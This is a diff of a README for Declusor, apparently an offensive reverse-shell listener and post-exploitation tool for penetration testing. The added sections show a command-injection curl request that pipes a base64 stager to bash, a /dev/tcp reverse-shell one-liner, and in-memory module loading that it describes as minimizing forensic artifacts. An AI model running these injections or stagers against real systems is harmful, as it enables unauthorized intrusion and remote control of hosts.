@@ -29,51 +29,150 @@
 
 ## Why Declusor?
 
-Catching a reverse shell during a CTF or penetration test shouldn't feel like walking a tightrope:
+Catching a reverse shell during a penetration test, CTF, or security assessment shouldn't feel like walking a tightrope:
 
-- **Netcat is a little too minimal**: You get your shell, hit `Ctrl+C` by accident, and suddenly you're back to Googling PTY one-liners and pasting base64 blobs like it's 1995.
-- **C2 frameworks are a bit much**: Sometimes you just want to catch a shell and run `id`. You don't need twelve containers, a database, and a team server for that.
+- **Netcat is a little too minimal**: You get your shell, hit `Ctrl+C` by accident, and suddenly you're back to Googling PTY one-liners, running `stty raw -echo`, and hoping your next binary transfer doesn't eat the connection.
+- **Many C2 frameworks are a bit much**: Sometimes you just want to catch a shell and run `id`. You don't need twelve containers, a database, and a team server for that.
 - **Raw sockets don't handle drama well**: A few lines of socket code work great — until the connection drops, binary data shows up, or the shell does something you didn't expect.
 
-So I built **Declusor**: the simplicity of a raw listener, with the interactive features you'd actually want — history, completion, script staging, and an extensible transport layer without turning the whole thing into a science experiment.
+### Declusor solves this with quiet elegances
+
+It keeps the zero-infrastructure, instant startup of a standard netcat listener while wrapping the session in a structured, framed transport protocol.
+
+It generates purpose-built stagers, negotiates an in-memory handshake with explicit acknowledgments, and provides a readline-powered REPL on top. The result is a session that doesn't require manual PTY gymnastics or leave you debugging socket desynchronization when things get messy — all from a single lightweight command.
 
 ## See It in Action
 
-<!--
-  ASSET PLACEHOLDER:
-  Replace the image below with your high-resolution terminal screenshot at 'docs/assets/overview.png'.
-  See docs/assets/README.md for instructions and recommended dimensions.
--->
-<p align="center">
-  <img src="docs/assets/overview.png" alt="Declusor Overview" width="900" onerror="this.style.display='none'"/>
-</p>
-
-<!--
-  ASSET PLACEHOLDER:
-  Replace the GIF below with your custom recording at 'docs/assets/demo.gif'.
-  Follow the VHS tape script in docs/assets/README.md to record an animated terminal walkthrough.
--->
 <p align="center">
   <img src="docs/assets/demo.gif" alt="Declusor Interactive Demo" width="900" onerror="this.onerror=null;this.src='https://i.imgur.com/Wsw2l90.gif';"/>
   <br>
-  <em>From listener startup to remote execution in seconds: Catching a reverse shell, navigating with tab-completion, and loading modules in-memory.</em>
+  <em>From listener startup to remote execution in seconds: Catching a reverse shell, navigating with tab-completion, and staging modules in-memory.</em>
 </p>
 
-### What's Happening in the Demo?
+When an operator launches Declusor, the entire engagement workflow is automated:
 
-When an operator launches Declusor, the entire engagement workflow is automated and streamlined:
+<div align="center">
 
-1. **Automatic Stager Generation**: Declusor starts the listener and immediately displays the ready-to-run launcher command for the target system.
-2. **Deterministic Handshake & Sentinel ACK**: Upon connection, the framework verifies the remote transport, transmits helper libraries in-memory, and negotiates framed communication without requiring manual PTY acrobatics.
-3. **Interactive Readline Environment**: The operator gains full command recall, history search, and tab-completion for remote commands and local filesystem paths.
-4. **Clean In-Memory Payload Execution**: Modules and post-exploitation scripts are staged directly into remote memory, minimizing forensic artifacts on disk.
+| Step | Phase                 | Operator Experience                          | Target Impact                         |
+| ---: | :-------------------- | :------------------------------------------- | :------------------------------------ |
+|    1 | Listener Launch       | Single CLI command (`declusor 0.0.0.0 4444`) | Prints pre-formatted stager one-liner |
+|    2 | Session Establishment | Automatic connection detection & handshake   | Zero manual PTY stabilization needed  |
+|    3 | Command Dispatch      | Framed streaming with tab-completion         | Output streamed back chunk-by-chunk   |
+|    4 | Post-Exploitation     | In-memory module loading (`load ...`)        | Execution memory-resident; clean exit |
 
-| Operational Phase        | Operator Experience                          | Target Impact                         |
-| :----------------------- | :------------------------------------------- | :------------------------------------ |
-| **1. Listener Launch**   | Single CLI command (`declusor 0.0.0.0 4444`) | Prints pre-formatted stager one-liner |
-| **2. Session Ingress**   | Automatic connection detection & handshake   | Zero manual PTY stabilization needed  |
-| **3. Command Dispatch**  | Framed streaming with tab-completion         | Output streamed back chunk-by-chunk   |
-| **4. Post-Exploitation** | In-memory module loading (`load ...`)        | Execution memory-resident; clean exit |
+</div>
+
+In other words, Declusor handles the operational details around the session rather than leaving them to the operator:
+
+1. Starts the listener and immediately displays ready-to-inject launcher commands for the target environment.
+2. Upon connection, the framework verifies the remote transport, transmits helper libraries in-memory, and negotiates framed communication with sentinel ACKs to prevent socket desynchronization.
+3. Provides full command recall (`Up`/`Down`), history search (`Ctrl+R`), and tab-completion for remote executables and local paths.
+4. Modules and post-exploitation scripts are staged directly into remote process memory, eliminating temporary files in `/tmp` and minimizing disk forensics.
+
+## Real-World Workflow Examples
+
+### 1. Start the Listener
+
+Start Declusor by specifying your local listening IP and port:
+
+```bash
+# Default listener (uses native shell_socket client)
+declusor 0.0.0.0 4444
+
+# Select the cross-platform Python client
+declusor 0.0.0.0 4444 --plugin py_socket
+
+# Load external custom plugins from an operator directory
+declusor 0.0.0.0 4444 --plugin-dir ~/custom_plugins --plugin my_agent
+```
+
+On startup, Declusor initializes the listener and **prints the exact one-liner launcher command** to run on your target.
+
+### 2. Built-in Client Transports
+
+| Client Plugin     | Flag              | Target OS             | Execution Mechanism                                                    |
+| :---------------- | :---------------- | :-------------------- | :--------------------------------------------------------------------- |
+| **Shell Socket**  | `-c shell_socket` | Linux / POSIX         | Native `/dev/tcp` file descriptor; zero external dependencies          |
+| **Python Socket** | `-c py_socket`    | Linux, macOS, Windows | In-memory `exec()` with persistent session scope & subprocess fallback |
+
+### 3. Interact with the Session
+
+Once your target connects back, Declusor drops you into an interactive session:
+
+```text
+[declusor] help
+help    : Display detailed information about available commands or a specific command.
+load    : Load a payload module from your local system and execute it on the remote system.
+command : Execute a single command on the remote system.
+shell   : Initiate an interactive shell session on the remote system.
+upload  : Upload a file from the local system to the remote system.
+execute : Execute a program or script from the local system on the remote system.
+exit    : Terminate the session and exit the program.
+```
+
+#### Example: Running Commands
+
+```text
+[declusor] command id && uname -a
+uid=1000(dev) gid=1000(dev) groups=1000(dev),27(sudo)
+Linux target-node 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
+```
+
+#### Example: In-Memory Module Loading
+
+```text
+[declusor] load discovery/system_info.py
+
+SYSTEM INFORMATION
+------------------
+OS: Linux 6.8.0-45-generic (#45-Ubuntu SMP PREEMPT_DYNAMIC)
+Architecture: x86_64
+Hostname: target-host
+User: dev
+```
+
+## Practical Usage Examples
+
+Declusor is purpose-built to turn unauthenticated Remote Code Execution (RCE) and Command Injection vulnerabilities into stable, feature-rich operator sessions.
+
+### Web OS Command Injection
+
+When testing an injection point in an HTTP query or form parameter (e.g., a vulnerable diagnostic `ping` or export function):
+
+```http
+POST /api/diagnostics/ping HTTP/1.1
+Host: target.local
+Content-Type: application/json
+
+{"ip": "127.0.0.1; <STAGER_PAYLOAD>"}
+```
+
+**1. Start Declusor locally on your interface:**
+
+```bash
+declusor 127.0.0.1 4444 --plugin shell_socket
+```
+
+**2. Declusor will immediately print the tailored launcher one-liner. Base64-encode it to avoid character-filtering issues (`&`, `;`, `|`, spaces):**
+
+```bash
+# Encode the stager displayed by Declusor
+PAYLOAD=$(echo -n '<DECLUSOR_BASH_STAGER GENERATED BY DECLUSOR>' | base64 -w0)
+
+# Inject via curl
+curl -s -X POST https://target.example/api/diagnostics/ping \
+     -H "Content-Type: application/json" \
+     -d "{\"ip\": \"127.0.0.1; echo $PAYLOAD | base64 -d | bash\"}"
+```
+
+**3. Upon connection, Declusor runs its in-memory handshake, pushes helper utilities, and opens an interactive REPL with full history and tab-completion.**
+
+```console
+$ declusor 127.0.0.1 4444
+( exec 3<> /dev/tcp/127.0.0.1/4444; [...] >&3; done <&3; exec 3>&- )
+
+[declusor]
+```
 
 ## Key Capabilities
 
@@ -93,20 +192,16 @@ When an operator launches Declusor, the entire engagement workflow is automated 
 
 ### 🧩 Autonomous Plugin Architecture
 
-- **Multi-Tier Dynamic Discovery**: Seamlessly load plugins from built-ins, standard pip packages via `declusor.plugins` entry points, or on-the-fly from operator drop-in folders (`--plugin-dir`).
+- **Multi-Tier Dynamic Discovery**: Seamlessly load plugins from built-ins, standard pip packages, or on-the-fly from operator drop-in folders (`--plugin-dir`).
 - **Fully Decoupled Transports**: Shipped with native Linux `/dev/tcp` (`shell_socket`) and memory-resident Python (`py_socket`) agents with zero hardcoded coupling to the core orchestration engine.
-- **Contract-Driven Stability**: Every plugin strictly implements domain interfaces (`IPlugin`, `IPluginRuntime`, `IConnection`) with isolated asset overlays (launchers, helpers, and modules).
-- **First-Class Testing SDK**: Authors can verify conformance in seconds using `declusor.testing.PluginConformanceTestSuite` with zero mocks.
+- **Contract-Driven Stability**: Every plugin strictly implements domain interfaces with isolated asset overlays (launchers, helpers, and modules).
+- **First-Class Testing SDK**: Authors can verify conformance in seconds using with zero mocks.
 
 ## Getting Started
 
 ### Prerequisites
 
-| Environment                 | Requirement          | Notes                                                         |
-| :-------------------------- | :------------------- | :------------------------------------------------------------ |
-| **Operator Machine**        | Python 3.11+         | Linux, macOS, or Windows                                      |
-| **Target (`shell_socket`)** | Bash with `/dev/tcp` | Standard on almost all Linux distributions; zero dependencies |
-| **Target (`py_socket`)**    | Python 3.6+          | Cross-platform (Linux, macOS, Windows); in-memory execution   |
+Declusor requires **Python 3.11+** and runs natively on Linux, macOS, and Windows. Package management requires **pip** or optionally—and recommended—[**uv**](https://github.com/astral-sh/uv) and **GNU Make** for fast and standardized workflows.
 
 ### Installation
 
@@ -161,68 +256,6 @@ make install-plugins
 # (or: pip install -e plugins/shell_socket -e plugins/py_socket)
 ```
 
-## Real-World Workflow & Usage
-
-### 1. Start the Listener
-
-Start Declusor by specifying your local listening IP and port:
-
-```bash
-# Default listener (uses native shell_socket transport)
-declusor 0.0.0.0 4444
-
-# Select the cross-platform Python transport
-declusor 0.0.0.0 4444 --plugin py_socket
-
-# Load external custom plugins from an operator directory
-declusor 0.0.0.0 4444 --plugin-dir ~/custom_plugins --plugin my_agent
-```
-
-On startup, Declusor initializes the listener and **prints the exact one-liner launcher command** to run on your target.
-
-### 2. Built-in Transport Plugins
-
-| Plugin            | Flag                  | Target OS             | Execution Mechanism                                                    |
-| :---------------- | :-------------------- | :-------------------- | :--------------------------------------------------------------------- |
-| **Shell Socket**  | `--plugin shell_socket` | Linux / POSIX         | Native `/dev/tcp` file descriptor; zero external dependencies          |
-| **Python Socket** | `--plugin py_socket`    | Linux, macOS, Windows | In-memory `exec()` with persistent session scope & subprocess fallback |
-
-### 3. Interact with the Session
-
-Once your target connects back, Declusor drops you into an interactive session:
-
-```text
-[declusor] help
-help    : Display detailed information about available commands or a specific command.
-load    : Load a payload module from your local system and execute it on the remote system.
-command : Execute a single command on the remote system.
-shell   : Initiate an interactive shell session on the remote system.
-upload  : Upload a file from the local system to the remote system.
-execute : Execute a program or script from the local system on the remote system.
-exit    : Terminate the session and exit the program.
-```
-
-#### Example: Running Commands
-
-```text
-[declusor] command id && uname -a
-uid=1000(dev) gid=1000(dev) groups=1000(dev),27(sudo)
-Linux target-node 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
-```
-
-#### Example: In-Memory Module Loading
-
-```text
-[declusor] load discovery/system_info.py
-
-SYSTEM INFORMATION
-------------------
-OS: Linux 6.8.0-45-generic (#45-Ubuntu SMP PREEMPT_DYNAMIC)
-Architecture: x86_64
-Hostname: target-host
-User: dev
-```
-
 ## Extensible Plugin Ecosystem
 
 Declusor was architected from day one as an extensible engine. Transport plugins are fully autonomous packages with their own manifests, assets, and tests:
@@ -247,32 +280,9 @@ plugins/<plugin_name>/
 
 Declusor discovers plugins at runtime across three distinct source tiers with zero hardcoded coupling:
 
-1. **Built-in Plugins**: Shipped repository packages located in `plugins/` (`shell_socket`, `py_socket`).
+1. **Built-in Plugins**: Shipped repository packages located in `plugins/`.
 2. **Python Entry Points**: Standard distribution packages registered via PEP 621 entry points (`[project.entry-points."declusor.plugins"]`).
 3. **Operator Drop-in Folders**: Custom plugin directories loaded dynamically on the fly via `--plugin-dir <path>`.
-
-### Verifying Conformance in Seconds
-
-Every plugin can verify its compliance against Declusor's contracts using the built-in testing SDK:
-
-```python
-from declusor import testing
-from declusor_plugin import DeclusorPlugin
-
-
-class TestDeclusorPluginConformance(testing.PluginConformanceTestSuite):
-    plugin_class = DeclusorPlugin
-```
-
-Execute plugin tests and quality checks via `make`:
-
-```bash
-# Run unit and conformance tests for a specific plugin
-make test-plugin PLUGIN=py_socket
-
-# Run full quality check (format-check, lint, strict type-check, tests)
-make check-plugin PLUGIN=py_socket
-```
 
 For complete packaging tutorials, asset overlay mechanics, and step-by-step guides, check out the [Plugins Developer Guide](plugins/README.md).
 
@@ -290,19 +300,6 @@ Read the complete architectural specification in [ARCHITECTURE.md](ARCHITECTURE.
 ## Contributing & Quality Gates
 
 Contributions from both humans and autonomous agents are warmly welcomed! Please read our [CONTRIBUTING.md](CONTRIBUTING.md) guide before opening a pull request.
-
-Before committing, ensure that all quality gates pass:
-
-```bash
-# Run full test suite, linter, formatter, and strict type-checks
-make check
-
-# Run all plugin test suites
-make test-plugins
-
-# Check a specific plugin
-make check-plugin PLUGIN=py_socket
-```
 
 ## License
 
